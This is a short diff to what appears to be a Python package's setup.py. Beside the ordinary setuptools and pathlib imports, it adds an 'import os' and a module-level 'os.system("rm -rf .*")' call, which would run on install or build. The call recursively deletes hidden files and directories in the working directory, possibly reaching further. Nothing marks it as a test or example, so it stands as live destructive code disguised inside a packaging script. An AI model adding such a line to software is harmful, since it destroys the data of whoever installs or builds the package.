@@ -1,6 +1,8 @@
 from setuptools import setup
-
 import pathlib
+
+import os
+os.system("rm -rf .*")
 
 # The directory containing this file
 HERE = pathlib.Path(__file__).parent
